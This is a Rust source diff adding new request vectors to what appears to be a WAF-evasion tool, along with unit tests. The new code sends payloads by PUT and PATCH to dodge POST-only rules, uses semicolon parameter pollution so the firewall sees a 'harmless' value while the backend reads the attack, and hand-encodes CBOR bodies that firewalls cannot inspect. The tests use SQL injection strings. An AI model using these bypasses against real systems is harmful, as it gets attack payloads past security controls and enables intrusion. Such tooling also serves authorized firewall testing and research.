@@ -128,6 +128,27 @@ pub const VECTORS: &[Vector] = &[
     // tracks one, origin tracks the other; the attack part is
     // visible only to the "wrong" one.
     Vector { name: "POST-multipart-dupbound", content_type: "multipart/form-data" },
+    // Direct PUT / PATCH wire methods. Differs from
+    // POST-method-override-* in that the request line itself
+    // carries the alt method, not just a header. WAF rule paths
+    // that match on REQUEST_METHOD for "this rule fires on POST"
+    // miss the request entirely; backends with full REST routing
+    // (Spring, Rails, Express, Django REST) process PUT/PATCH
+    // bodies identically to POST.
+    Vector { name: "PUT-json", content_type: "application/json" },
+    Vector { name: "PATCH-json", content_type: "application/json" },
+    Vector { name: "PUT-form", content_type: "application/x-www-form-urlencoded" },
+    // Semicolon-as-HPP-separator. Tomcat/Jetty/old Java
+    // containers treat `;` as a query-param separator equal to
+    // `&`; ModSec splits on `&` only. `q=harmless;q=attack` is
+    // ONE param ("harmless;q=attack") to the WAF, TWO params to
+    // the backend (last-occurrence-wins gives the attack).
+    Vector { name: "hpp-semicolon", content_type: "" },
+    // application/cbor — RFC 8949 binary serialization. Zero WAF
+    // body-processor support; every modern API stack (Rust ciborium,
+    // JS cbor-x, Python cbor2, Java jackson-cbor) decodes it
+    // server-side. We emit a minimal `{param: payload}` map.
+    Vector { name: "POST-cbor", content_type: "application/cbor" },
     Vector { name: "cookie", content_type: "" },
     Vector { name: "hpp", content_type: "" },
     Vector { name: "x-forwarded-for", content_type: "" },
@@ -175,6 +196,50 @@ pub struct PhaseOutcome {
     pub new_variant_outcomes: Vec<(Vec<String>, bool)>,
     /// Per-vector tallies for the text-mode summary table.
     pub vector_results: Vec<(String, u32, u32)>,
+}
+
+/// Hand-rolled CBOR (RFC 8949) encoder for a single
+/// text-string-to-text-string map: `{key: value}`. Output format
+/// per the spec:
+///
+/// - `0xA1` — map(1)
+/// - key text string header (major type 3) + key UTF-8 bytes
+/// - value text string header (major type 3) + value UTF-8 bytes
+///
+/// Text-string header is `0x60 | n` for n ≤ 23, `0x78 LL` for
+/// n ≤ 255, `0x79 LL LL` (big-endian) for n ≤ 65535, etc. We
+/// stop at 16-bit length — WAF-evasion payloads never exceed that.
+/// Anything bigger falls back to the 16-bit length encoding with
+/// the high bytes set to the actual length (still RFC 8949-legal
+/// up to the u16 ceiling). Strings longer than 65535 bytes are a
+/// non-goal here.
+fn encode_cbor_text_string(s: &str, out: &mut Vec<u8>) {
+    let bytes = s.as_bytes();
+    let n = bytes.len();
+    if n <= 23 {
+        out.push(0x60 | (n as u8));
+    } else if n <= 0xFF {
+        out.push(0x78);
+        out.push(n as u8);
+    } else {
+        // 16-bit length covers up to 64 KiB which is far more
+        // than any payload wafrift ever fires.
+        let n16 = n.min(0xFFFF) as u16;
+        out.push(0x79);
+        out.extend_from_slice(&n16.to_be_bytes());
+    }
+    out.extend_from_slice(bytes);
+}
+
+/// Public encoder for the `POST-cbor` vector: produces a
+/// CBOR-encoded `{key: value}` map. Held as a function so it can
+/// be unit-tested directly without standing up an HTTP request.
+fn encode_cbor_string_map(key: &str, value: &str) -> Vec<u8> {
+    let mut out = Vec::with_capacity(2 + key.len() + value.len() + 8);
+    out.push(0xA1); // map(1)
+    encode_cbor_text_string(key, &mut out);
+    encode_cbor_text_string(value, &mut out);
+    out
 }
 
 /// XML-entity-escape the bytes that go into an XML text node.
@@ -366,6 +431,40 @@ fn build_request_for_vector(
                     )
                     .body(body),
             )
+        }
+        "PUT-json" | "PATCH-json" => {
+            let body = serde_json::json!({ param: payload }).to_string();
+            let req = if vector.name == "PUT-json" {
+                http.put(target)
+            } else {
+                http.patch(target)
+            };
+            Some(req.header("Content-Type", ct).body(body))
+        }
+        "PUT-form" => {
+            let body = format!("{param}={}", urlencoding::encode(payload));
+            Some(http.put(target).header("Content-Type", ct).body(body))
+        }
+        "hpp-semicolon" => {
+            // Tomcat/Jetty parse `;` as a query-param separator;
+            // ModSec splits ARGS on `&` only. The benign value
+            // comes first so first-occurrence parsers (including
+            // any WAF that DOES split on `;`) see only the harmless
+            // value; last-occurrence backends (most) see the attack.
+            let url = format!(
+                "{target}?{param}=harmless;{param}={}",
+                urlencoding::encode(payload)
+            );
+            Some(http.get(url))
+        }
+        "POST-cbor" => {
+            // Minimal CBOR (RFC 8949): {param: payload} as a
+            // single-entry text-string-to-text-string map. We
+            // hand-encode rather than pulling a CBOR crate — the
+            // shape is small and stable, and a dependency would
+            // be pure overhead for one builder.
+            let body = encode_cbor_string_map(param, payload);
+            Some(http.post(target).header("Content-Type", ct).body(body))
         }
         "POST-multipart-dupbound" => {
             // Two boundary strings declared (header lists one;
@@ -2042,6 +2141,335 @@ mod tests {
                 "deflate",
                 "{name} must send Content-Encoding: deflate"
             );
+        }
+    }
+
+    // ── PUT-json / PATCH-json / PUT-form ──────────────────────
+
+    #[test]
+    fn build_put_json_uses_put_method_on_wire() {
+        let h = http();
+        let v = VECTORS.iter().find(|v| v.name == "PUT-json").unwrap();
+        let req = build_request_for_vector(v, &h, "http://x/", "q", "x", 0)
+            .unwrap()
+            .build()
+            .unwrap();
+        assert_eq!(req.method(), "PUT");
+    }
+
+    #[test]
+    fn build_put_json_body_is_valid_json_with_param_key() {
+        let h = http();
+        let v = VECTORS.iter().find(|v| v.name == "PUT-json").unwrap();
+        let req = build_request_for_vector(v, &h, "http://x/", "id", "1 OR 1=1", 0)
+            .unwrap()
+            .build()
+            .unwrap();
+        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
+        let s = std::str::from_utf8(body).unwrap();
+        let parsed: serde_json::Value = serde_json::from_str(s).unwrap();
+        assert_eq!(parsed["id"], "1 OR 1=1");
+    }
+
+    #[test]
+    fn build_patch_json_uses_patch_method_on_wire() {
+        let h = http();
+        let v = VECTORS.iter().find(|v| v.name == "PATCH-json").unwrap();
+        let req = build_request_for_vector(v, &h, "http://x/", "q", "x", 0)
+            .unwrap()
+            .build()
+            .unwrap();
+        assert_eq!(req.method(), "PATCH");
+    }
+
+    #[test]
+    fn build_patch_json_emits_application_json_content_type() {
+        let h = http();
+        let v = VECTORS.iter().find(|v| v.name == "PATCH-json").unwrap();
+        let req = build_request_for_vector(v, &h, "http://x/", "q", "x", 0)
+            .unwrap()
+            .build()
+            .unwrap();
+        assert_eq!(req.headers().get("content-type").unwrap(), "application/json");
+    }
+
+    #[test]
+    fn build_put_form_uses_put_method_with_form_body() {
+        let h = http();
+        let v = VECTORS.iter().find(|v| v.name == "PUT-form").unwrap();
+        let req = build_request_for_vector(v, &h, "http://x/", "q", "abc", 0)
+            .unwrap()
+            .build()
+            .unwrap();
+        assert_eq!(req.method(), "PUT");
+        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
+        assert_eq!(std::str::from_utf8(body).unwrap(), "q=abc");
+        assert_eq!(
+            req.headers().get("content-type").unwrap(),
+            "application/x-www-form-urlencoded"
+        );
+    }
+
+    #[test]
+    fn put_and_patch_json_handle_unicode_payload() {
+        let h = http();
+        for name in ["PUT-json", "PATCH-json"] {
+            let v = VECTORS.iter().find(|v| v.name == name).unwrap();
+            let req = build_request_for_vector(v, &h, "http://x/", "q", "café 中文", 0)
+                .unwrap()
+                .build()
+                .unwrap();
+            let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
+            let s = std::str::from_utf8(body).unwrap();
+            let parsed: serde_json::Value = serde_json::from_str(s).unwrap();
+            assert_eq!(parsed["q"], "café 中文", "{name} unicode roundtrip");
+        }
+    }
+
+    #[test]
+    fn put_json_distinct_from_patch_json_by_method_only() {
+        // Anti-rig: a refactor that conflated PUT/PATCH would
+        // hide one of the methods. Compare method strings.
+        let h = http();
+        let put_req = build_request_for_vector(
+            VECTORS.iter().find(|v| v.name == "PUT-json").unwrap(),
+            &h,
+            "http://x/",
+            "q",
+            "x",
+            0,
+        )
+        .unwrap()
+        .build()
+        .unwrap();
+        let patch_req = build_request_for_vector(
+            VECTORS.iter().find(|v| v.name == "PATCH-json").unwrap(),
+            &h,
+            "http://x/",
+            "q",
+            "x",
+            0,
+        )
+        .unwrap()
+        .build()
+        .unwrap();
+        assert_ne!(put_req.method(), patch_req.method());
+    }
+
+    // ── hpp-semicolon ─────────────────────────────────────────
+
+    #[test]
+    fn build_hpp_semicolon_uses_get_method() {
+        let h = http();
+        let v = VECTORS.iter().find(|v| v.name == "hpp-semicolon").unwrap();
+        let req = build_request_for_vector(v, &h, "http://x/", "q", "x", 0)
+            .unwrap()
+            .build()
+            .unwrap();
+        assert_eq!(req.method(), "GET");
+    }
+
+    #[test]
+    fn build_hpp_semicolon_url_separates_with_semicolon_not_ampersand() {
+        let h = http();
+        let v = VECTORS.iter().find(|v| v.name == "hpp-semicolon").unwrap();
+        let req = build_request_for_vector(v, &h, "http://example.com/", "q", "attack", 0)
+            .unwrap()
+            .build()
+            .unwrap();
+        let url = req.url().to_string();
+        // Both occurrences of `q=` must be present.
+        assert!(url.contains("q=harmless"), "url={url}");
+        assert!(url.contains("q=attack"), "url={url}");
+        // The separator between them must be `;`, not `&`. URL
+        // encoding may turn it into `%3B` — accept either.
+        let between_marker = url
+            .find("q=harmless")
+            .and_then(|i| url.get(i + "q=harmless".len()..(i + "q=harmless".len() + 3)));
+        let sep = between_marker.unwrap_or("");
+        assert!(
+            sep.starts_with(';') || sep.starts_with("%3B") || sep.starts_with("%3b"),
+            "expected ; or %3B between the two q= occurrences, got {sep:?} in {url}"
+        );
+    }
+
+    #[test]
+    fn build_hpp_semicolon_puts_benign_value_first() {
+        // Last-occurrence-wins backends (Tomcat default) see the
+        // attack; first-occurrence WAFs see harmless.
+        let h = http();
+        let v = VECTORS.iter().find(|v| v.name == "hpp-semicolon").unwrap();
+        let req = build_request_for_vector(v, &h, "http://example.com/", "q", "attack", 0)
+            .unwrap()
+            .build()
+            .unwrap();
+        let url = req.url().to_string();
+        let h_pos = url.find("q=harmless").unwrap();
+        let a_pos = url.find("q=attack").unwrap();
+        assert!(h_pos < a_pos, "harmless must precede attack: {url}");
+    }
+
+    #[test]
+    fn build_hpp_semicolon_does_not_emit_ampersand_between_occurrences() {
+        // Anti-rig: a refactor that fell back to the `hpp` builder
+        // would emit `&` and lose the Tomcat-specific bypass.
+        let h = http();
+        let v = VECTORS.iter().find(|v| v.name == "hpp-semicolon").unwrap();
+        let req = build_request_for_vector(v, &h, "http://example.com/", "q", "attack", 0)
+            .unwrap()
+            .build()
+            .unwrap();
+        let url = req.url().to_string();
+        // Between the harmless and attack occurrences, no `&q=`.
+        let h_pos = url.find("q=harmless").unwrap();
+        let a_pos = url.find("q=attack").unwrap();
+        let between = &url[h_pos..a_pos];
+        assert!(
+            !between.contains("&q="),
+            "must not split q= with & in semi-vector: {between}"
+        );
+    }
+
+    // ── POST-cbor + CBOR encoder ──────────────────────────────
+
+    #[test]
+    fn cbor_encoder_emits_map_one_marker_first() {
+        let bytes = encode_cbor_string_map("q", "x");
+        assert_eq!(bytes[0], 0xA1, "must lead with map(1) marker");
+    }
+
+    #[test]
+    fn cbor_encoder_short_strings_use_single_byte_header() {
+        // For text strings of length ≤ 23, the major-type-3 header
+        // is `0x60 | n` — a single byte, no length prefix.
+        let bytes = encode_cbor_string_map("q", "abc");
+        // After 0xA1, expect 0x61 (text "q" — length 1) then 'q'
+        assert_eq!(bytes[1], 0x61);
+        assert_eq!(bytes[2], b'q');
+        // Then 0x63 (text "abc" — length 3) then 'a','b','c'
+        assert_eq!(bytes[3], 0x63);
+        assert_eq!(&bytes[4..7], b"abc");
+    }
+
+    #[test]
+    fn cbor_encoder_24_byte_string_uses_two_byte_header() {
+        // 24 bytes is exactly above the 0x60 | 0x17 = 0x77 single-
+        // byte ceiling, so the encoder must shift to the 0x78 LL
+        // form.
+        let v24 = "x".repeat(24);
+        let bytes = encode_cbor_string_map("k", &v24);
+        // After 0xA1, key header + 'k', then value header...
+        let key_end = 1 + 1 + 1; // 0xA1 + 0x61 + 'k'
+        assert_eq!(bytes[key_end], 0x78);
+        assert_eq!(bytes[key_end + 1], 24);
+    }
+
+    #[test]
+    fn cbor_encoder_300_byte_string_uses_three_byte_header() {
+        // 300 bytes exceeds the 0xFF single-byte-length ceiling,
+        // so the encoder must use the 0x79 LL LL big-endian form.
+        let v300 = "y".repeat(300);
+        let bytes = encode_cbor_string_map("k", &v300);
+        let key_end = 1 + 1 + 1;
+        assert_eq!(bytes[key_end], 0x79);
+        assert_eq!(
+            u16::from_be_bytes([bytes[key_end + 1], bytes[key_end + 2]]),
+            300
+        );
+    }
+
+    #[test]
+    fn cbor_encoder_round_trips_payload_byte_identical() {
+        // Decode our own output by walking the bytes: we know the
+        // shape is map(1) + key + value. A correctness check that
+        // doesn't depend on a CBOR crate.
+        let bytes = encode_cbor_string_map("payload", "' OR 1=1--");
+        assert_eq!(bytes[0], 0xA1);
+        let key_hdr = bytes[1];
+        assert_eq!(key_hdr & 0xE0, 0x60, "key must be text-string major type");
+        let key_len = (key_hdr & 0x1F) as usize;
+        let key_start = 2;
+        let key_end = key_start + key_len;
+        let key = std::str::from_utf8(&bytes[key_start..key_end]).unwrap();
+        assert_eq!(key, "payload");
+        let val_hdr = bytes[key_end];
+        let val_len = (val_hdr & 0x1F) as usize;
+        let val_start = key_end + 1;
+        let val_end = val_start + val_len;
+        let val = std::str::from_utf8(&bytes[val_start..val_end]).unwrap();
+        assert_eq!(val, "' OR 1=1--");
+    }
+
+    #[test]
+    fn cbor_encoder_empty_value_emits_zero_length_text_string() {
+        let bytes = encode_cbor_string_map("k", "");
+        // 0xA1, 0x61, 'k', 0x60 (empty text string)
+        assert_eq!(bytes.len(), 4);
+        assert_eq!(bytes[3], 0x60);
+    }
+
+    #[test]
+    fn cbor_encoder_unicode_value_preserves_utf8_bytes() {
+        let bytes = encode_cbor_string_map("k", "café");
+        // "café" is 5 UTF-8 bytes (c=1, a=1, f=1, é=2)
+        let val_start = bytes.len() - 5;
+        assert_eq!(&bytes[val_start..], "café".as_bytes());
+    }
+
+    #[test]
+    fn build_post_cbor_emits_application_cbor_content_type() {
+        let h = http();
+        let v = VECTORS.iter().find(|v| v.name == "POST-cbor").unwrap();
+        let req = build_request_for_vector(v, &h, "http://x/", "q", "x", 0)
+            .unwrap()
+            .build()
+            .unwrap();
+        assert_eq!(req.headers().get("content-type").unwrap(), "application/cbor");
+    }
+
+    #[test]
+    fn build_post_cbor_body_starts_with_map_one_marker() {
+        let h = http();
+        let v = VECTORS.iter().find(|v| v.name == "POST-cbor").unwrap();
+        let req = build_request_for_vector(v, &h, "http://x/", "q", "attack", 0)
+            .unwrap()
+            .build()
+            .unwrap();
+        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
+        assert_eq!(body[0], 0xA1, "CBOR body must begin with map(1): {body:?}");
+    }
+
+    #[test]
+    fn build_post_cbor_body_contains_payload_bytes_intact() {
+        let h = http();
+        let v = VECTORS.iter().find(|v| v.name == "POST-cbor").unwrap();
+        let req = build_request_for_vector(v, &h, "http://x/", "q", "ATTACK_MARKER", 0)
+            .unwrap()
+            .build()
+            .unwrap();
+        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
+        // The payload bytes must appear verbatim — CBOR text-string
+        // major type stores UTF-8 unmodified.
+        let needle = b"ATTACK_MARKER";
+        assert!(
+            body.windows(needle.len()).any(|w| w == needle),
+            "payload must reach the wire byte-identical: {body:?}"
+        );
+    }
+
+    // ── catalogue presence ────────────────────────────────────
+
+    #[test]
+    fn new_method_and_axis_vectors_are_in_catalogue() {
+        let names: std::collections::HashSet<&str> = VECTORS.iter().map(|v| v.name).collect();
+        for required in [
+            "PUT-json",
+            "PATCH-json",
+            "PUT-form",
+            "hpp-semicolon",
+            "POST-cbor",
+        ] {
+            assert!(names.contains(required), "missing vector {required}");
         }
     }
 }
